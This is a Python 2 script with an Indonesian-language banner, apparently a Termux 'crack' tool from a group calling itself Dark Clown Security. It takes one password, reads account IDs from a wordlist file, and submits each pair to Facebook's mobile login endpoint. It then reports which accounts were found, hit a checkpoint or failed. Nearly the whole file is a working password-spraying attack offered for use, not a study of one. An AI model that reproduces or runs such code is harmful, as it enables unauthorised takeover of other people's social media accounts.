import os
import random
import requests
import sys
import time
from time import sleep

#banner
os.system('clear')
time.sleep(2)
print ('\33[32;1m+\33[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\33[32;1m+')
time.sleep(0.1)
print ('+\33[1;33m	  [\33[31;1m!\33[1;33m]  \33[1;36mTOOLS TERMUX BY SUZU\33[31;1mX\33[1;36mPLOIT v1 \33[1;33m[\33[31;1m!\33[1;33m]         \33[32;1m+')
time.sleep(0.1)
print "+\33[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\33[32;1m+"
time.sleep(0.1)
print ('+   \33[33;1m[\33[31;1m*\33[1;33m] \33[1;36mAuthor \33[1;31m: \33[1;36mSuzu\33[31;1mx\33[1;36mploit                              \33[1;32m+')
time.sleep(0.1)
print ('+   \33[1;33m[\33[31;1m*\33[1;33m] \33[1;36mTeam   \33[31;1m: \33[1;36mDark \33[31;1mClown \33[1;36mSecurity                     \33[1;32m+ ')
time.sleep(0.1)
print ('+   \33[1;33m[\33[31;1m*\33[1;33m] \33[1;36mGithub \33[31;1m: \33[1;36mhttps://github.com/suzu-\33[31;1mx\33[1;36mploit          \33[32;1m+')
time.sleep(0.1)
print ('+\33[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\33[32;1m+')
time.sleep(0.1)
print ('+  \33[31;1mSEBELUM MULAI CRACK ISI WORDLIST NYA TERLEBIH DAHULU  \33[32;1m+')
time.sleep(0.1)
print ('+\33[1;33m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\33[32;1m+')
time.sleep(0.1)
print ""
time.sleep(0.1)
print ('\33[1;33m[\33[31;1m!\33[1;33m] \33[1;36mLangsung Crack')
time.sleep(0.1)
print ""
id = raw_input('\33[1;33m[\33[1;36m+\33[1;33m] \33[1;36mMASUKAN ID \33[31;1m~>\33[1;33m ')
pw = raw_input('\33[1;33m[\33[31;1m!\33[1;33m] \33[1;36mMASUKAN PASSWORD \33[31;1m~>\33[1;33m ')



def project1(id,pw):

       url = "https://m.facebook.com/login.php"

       data = {
          "email":id,
           "pass":pw,
           }

       r = requests.post(url, data=data)

       if "&_rdc=1&_rdr" in r.url:
               print ('\33[1;33m[\33[1;36m+\33[1;33m] \33[1;36mAKUN DITEMUKAN '), id, "\33[31;1m~>", pw
       elif "checkpoint" in r.url:
               print ('\33[1;33m[\33[31;1m!\33[1;33m] \33[1;36mAKUN TERKENA CHECKPOINT'), id, "\33[31;1m~>", pw
       else:
               print ('\33[1;33m[\33[31;1mx\33[1;33m] \33[1;36mTIDAK DITEMUKAN'), id, "\33[31;1m~>", pw


def project2(id,pw):
       ex = open('wordlist.txt',  "r").readlines()
       for i in ex:
            project1(i.strip(),pw)

try:
   project2(id,pw)

except:
   exit()
